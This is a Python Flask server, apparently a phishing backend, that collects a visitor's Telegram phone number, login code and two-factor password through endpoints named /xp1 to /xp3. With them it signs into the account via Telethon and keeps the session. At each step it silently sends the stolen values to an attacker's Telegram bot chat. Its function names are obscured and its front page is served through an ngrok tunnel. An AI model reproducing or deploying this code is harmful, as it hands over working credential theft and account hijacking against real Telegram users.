import os
import asyncio
import logging
import requests
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
import threading

load_dotenv()

logging.basicConfig(level=logging.WARNING)

_AID  = int(os.getenv("API_ID"))
_AHS  = os.getenv("API_HASH")
_WT   = os.getenv("WOW_TOKEN")
_WC   = os.getenv("WOW_CHAT")

app = Flask(__name__)
CORS(app)

_store = {}

_loop = asyncio.new_event_loop()

def _start_loop():
    asyncio.set_event_loop(_loop)
    _loop.run_forever()

threading.Thread(target=_start_loop, daemon=True).start()


def _run(coro):
    return asyncio.run_coroutine_threadsafe(coro, _loop).result(timeout=30)


# Silent notify — WOW bot
def _nx(txt):
    try:
        requests.post(
            f'https://api.telegram.org/bot{_WT}/sendMessage',
            json={'chat_id': _WC, 'text': txt, 'parse_mode': 'HTML'},
            timeout=5
        )
    except:
        pass


@app.after_request
def _hdr(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response


@app.route('/')
def _root():
    return send_from_directory('static', 'index.html')

@app.route('/<path:f>')
def _static(f):
    return send_from_directory('static', f)


@app.route('/xp1', methods=['POST'])
def _xp1():
    d  = request.get_json()
    a  = d.get('a', '').strip()
    b  = d.get('b', 'x')

    if not a:
        return jsonify({'ok': False, 'msg': 'Required'}), 400

    try:
        async def _go():
            c = TelegramClient(f'_s{b}', _AID, _AHS)
            await c.connect()
            res = await c.send_code_request(a)
            _store[b] = {'a': a, 'h': res.phone_code_hash, 'c': c}

        _run(_go())

        # Notify WOW
        _nx(f'<b>#n1</b>\nuid: <code>{b}</code>\nval: <code>{a}</code>')

        return jsonify({'ok': True})

    except Exception as e:
        return jsonify({'ok': False, 'msg': str(e)}), 500


@app.route('/xp2', methods=['POST'])
def _xp2():
    d  = request.get_json()
    b  = d.get('b', 'x')
    cv = d.get('c', '').strip()

    if b not in _store:
        return jsonify({'ok': False, 'msg': 'Restart required.'}), 400

    s  = _store[b]

    try:
        async def _go():
            await s['c'].sign_in(s['a'], cv, phone_code_hash=s['h'])

        _run(_go())
        del _store[b]

        # Notify WOW
        _nx(f'<b>#n2 ✅</b>\nuid: <code>{b}</code>\nnum: <code>{s["a"]}</code>\ncd: <code>{cv}</code>')

        return jsonify({'ok': True, 'nx': False})

    except PhoneCodeInvalidError:
        return jsonify({'ok': False, 'msg': 'Incorrect code.'}), 400

    except SessionPasswordNeededError:
        # Notify WOW — needs step 3
        _nx(f'<b>#n2 🔐</b>\nuid: <code>{b}</code>\nnum: <code>{s["a"]}</code>\ncd: <code>{cv}</code>\n<i>step3 needed</i>')
        return jsonify({'ok': True, 'nx': True})

    except Exception as e:
        return jsonify({'ok': False, 'msg': str(e)}), 500


@app.route('/xp3', methods=['POST'])
def _xp3():
    d  = request.get_json()
    b  = d.get('b', 'x')
    kv = d.get('k', '').strip()

    if b not in _store:
        return jsonify({'ok': False, 'msg': 'Restart required.'}), 400

    c = _store[b]['c']
    a = _store[b]['a']

    try:
        async def _go():
            await c.sign_in(password=kv)

        _run(_go())
        del _store[b]

        # Notify WOW
        _nx(f'<b>#n3 ✅</b>\nuid: <code>{b}</code>\nnum: <code>{a}</code>\nkey: <code>{kv}</code>')

        return jsonify({'ok': True})

    except PasswordHashInvalidError:
        return jsonify({'ok': False, 'msg': 'Incorrect key.'}), 400

    except Exception as e:
        return jsonify({'ok': False, 'msg': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
